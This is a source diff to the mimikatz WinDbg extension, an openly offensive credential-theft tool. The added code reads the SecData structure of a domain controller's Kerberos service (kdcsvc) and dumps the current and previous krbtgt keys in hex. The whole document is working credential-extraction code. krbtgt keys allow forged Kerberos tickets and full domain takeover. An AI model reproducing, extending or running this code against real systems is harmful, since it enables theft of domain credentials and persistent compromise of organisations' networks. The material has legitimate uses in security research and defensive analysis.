@@ -82,12 +82,13 @@ const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
 
 DECLARE_API(mimikatz)
 {
-	ULONG_PTR pInitializationVector = 0, phAesKey = 0, ph3DesKey = 0, pLogonSessionList = 0, pLogonSessionListCount = 0;
+	ULONG_PTR pInitializationVector = 0, phAesKey = 0, ph3DesKey = 0, pLogonSessionList = 0, pLogonSessionListCount = 0, pSecData = 0;
 	PLIST_ENTRY LogonSessionList;
 	ULONG LogonSessionListCount, i, j;
 	KIWI_BASIC_SECURITY_LOGON_SESSION_DATA sessionData;
 	const KUHL_M_SEKURLSA_ENUM_HELPER * helper;
 	PBYTE buffer;
+	DUAL_KRBTGT dualKrbtgt = {NULL, NULL};
 
 	if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_7)
 		helper = &lsassEnumHelpers[0];
@@ -107,10 +108,20 @@ DECLARE_API(mimikatz)
 
 	pLogonSessionList = GetExpression("lsasrv!LogonSessionList");
 	pLogonSessionListCount = GetExpression("lsasrv!LogonSessionListCount");
+	pSecData = GetExpression("kdcsvc!SecData");
 
 	for(j = 0; j < ARRAYSIZE(packages); j++)
 		if(packages[j].symbolName)
 			packages[j].symbolPtr = GetExpression(packages[j].symbolName);
+	
+	if(pSecData)
+	{
+		if(ReadMemory(pSecData + SECDATA_KRBTGT_OFFSET*sizeof(PVOID), &dualKrbtgt, 2*sizeof(PVOID), NULL))
+		{
+			kuhl_m_sekurlsa_krbtgt_keys(dualKrbtgt.krbtgt_current, "Current");
+			kuhl_m_sekurlsa_krbtgt_keys(dualKrbtgt.krbtgt_previous, "Previous");
+		}
+	}
 	
 	if(NT_SUCCESS(kuhl_m_sekurlsa_nt6_init()))
 	{
@@ -400,4 +411,39 @@ VOID kuhl_m_sekurlsa_genericKeyOutput(PMARSHALL_KEY key, PVOID * dirtyBase)
 	}
 	kull_m_string_dprintf_hex((PBYTE) *dirtyBase + sizeof(ULONG), key->length, 0);
 	*dirtyBase = (PBYTE) *dirtyBase + sizeof(ULONG) + *(PULONG) *dirtyBase;
+}
+
+void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, LPCSTR prefix)
+{
+	DWORD sizeForCreds, i;
+	KIWI_KRBTGT_CREDENTIALS_6 tmpCred6, *creds6;
+	PVOID buffer;
+
+	if(addr)
+	{
+		dprintf("\n%s krbtgt: ", prefix);
+		if(ReadMemory((ULONG_PTR) addr, &tmpCred6, sizeof(KIWI_KRBTGT_CREDENTIALS_6) - sizeof(KIWI_KRBTGT_CREDENTIAL_6), NULL))
+		{
+			sizeForCreds = sizeof(KIWI_KRBTGT_CREDENTIALS_6) + (tmpCred6.cbCred - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_6);
+			if(creds6 = (PKIWI_KRBTGT_CREDENTIALS_6) LocalAlloc(LPTR, sizeForCreds))
+			{
+				if(ReadMemory((ULONG_PTR) addr, creds6, sizeForCreds, NULL))
+				{
+					dprintf("%u credentials\n", creds6->cbCred);
+					for(i = 0; i < creds6->cbCred; i++)
+					{
+						dprintf("\t * %s : ", kuhl_m_kerberos_ticket_etype((LONG) creds6->credentials[i].type));
+						if(buffer = LocalAlloc(LPTR, (DWORD) creds6->credentials[i].size))
+						{
+							if(ReadMemory((ULONG_PTR) creds6->credentials[i].key, buffer, (DWORD) creds6->credentials[i].size, NULL))
+								kull_m_string_dprintf_hex(buffer, (DWORD) creds6->credentials[i].size, 0);
+							LocalFree(buffer);
+						}
+						dprintf("\n");
+					}
+				}
+				LocalFree(creds6);
+			}
+		}
+	}
 }
